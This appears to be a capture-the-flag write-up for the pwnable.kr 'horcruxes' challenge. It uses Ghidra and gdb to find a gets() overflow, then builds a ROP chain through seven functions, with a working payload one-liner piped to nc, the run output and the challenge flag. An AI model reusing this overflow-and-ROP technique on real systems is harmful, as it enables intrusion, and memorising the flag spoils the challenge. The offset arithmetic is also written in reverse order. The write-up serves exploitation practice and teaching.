@@ -1,0 +1,79 @@
+Upon realising the assmebly code is complex, I downloaded the entire folder using 
+scp -r -P2222 horcruxes@pwnable.kr:~/ ./
+
+Upon viewing the decompyled c-like code using Ghidra I realised that main limits us to certain syscalls.
+
+It then calls init_ABCDEFG which sets 7 random integers, that are to be retrieved using 7 appropriate functions, A,B,C,D,E,F,G, and their sum.
+
+At last ropme is called, allowing us to guess one of the random integers for it to be printed, followed by a call to gets whom result is compared with the random sum, giving us a change to retrieve the flag:
+
+  else {
+    printf("How many EXP did you earned? : ");
+    gets(local_78);
+    iVar1 = atoi(local_78);
+    if (iVar1 == sum) {
+      local_10 = open("flag",0);
+      sVar2 = read(local_10,local_78,100);
+      local_78[sVar2] = '\0';
+      puts(local_78);
+      close(local_10);
+                    /* WARNING: Subroutine does not return */
+      exit(0);
+    }
+
+We are going to use that last part for our advatage; We'll create a ROP chain - by exploiting a buffer-overflow using gets, we can overwrite the return address of ropme with the address of function A, which will then call function B as we'll insert its address too, and so on, until G is invoced, and will pass control to the address in main at which a jump to ropme occurs (Note that all of ropme instructions contain 0a in their address, thus we can't jump directly to printing the flag nor call it directly in the ROP chain).
+
+The ROP chain will allow us to have the 7 random integers printed, and the calculate and provide their sum for the flag to be outputed.
+
+From gdb, disas ropme:
+
+   0x080a00e8 <+223>:	push   eax
+   0x080a00e9 <+224>:	call   0x809fc50 <gets@plt>
+	...
+   0x080a0176 <+365>:	ret
+
+Running: 
+
+
+Breakpoint 1, 0x080a00e8 in ropme ()
+(gdb) x $eax
+0xffffdb54:	0x00000001
+(gdb) break *0x080a0176
+Breakpoint 2 at 0x80a0176
+(gdb) c
+Continuing.
+
+You'd better get more experience to kill Voldemort
+
+Breakpoint 2, 0x080a0176 in ropme ()
+(gdb) x $esp
+0xffffdbcc:	0x080a0001
+
+
+Thus the address gets writes to is 0xffffdb54, and the return address of ropme is 0xffffdbcc.
+Thus we'll have to write 0xffffdb54-0xffffdbcc=0x78=120 dummy bytes before providing the addresses of A,B,C,D,E,F,G, and the address of jmp ropme at main.
+
+Notice that a ROP chain works as at the beginning of a function executionm esp points the place where the return address is saved, and decreases by the size of an address with every function call, due to the nature of starting with pushing ebp and ending by poping to restore ebp, and another pop to get the return address.
+
+readelf -s horcruxes | grep FUNC 
+will give us the addresses of the relevant functions, and disas main will give us the address of the jmp instruction to ropme.
+
+Combining everything together in little-endian: 
+
+horcruxes@pwnable:~$ (echo 15; (for i in {1..120}; do printf %s 49; done;) | xxd -r -p; echo 4bfe09086afe090889fe0908a8fe0908c7fe0908e6fe090805ff0908fcff0908 0a | xxd -r -p; cat) | nc 0 9032 -q 1
+Voldemort concealed his splitted soul inside 7 horcruxes.
+Find all horcruxes, and destroy it!
+
+Select Menu:How many EXP did you earned? : You'd better get more experience to kill Voldemort
+You found "Tom Riddle's Diary" (EXP +471258802)
+You found "Marvolo Gaunt's Ring" (EXP +-1275143031)
+You found "Helga Hufflepuff's Cup" (EXP +845677748)
+You found "Salazar Slytherin's Locket" (EXP +194777572)
+You found "Rowena Ravenclaw's Diadem" (EXP +695561867)
+You found "Nagini the Snake" (EXP +-1098361773)
+You found "Harry Potter" (EXP +401832873)
+Select Menu:235604058           
+How many EXP did you earned? : 235604058
+Magic_spell_1s_4vad4_K3daVr4!
+
+
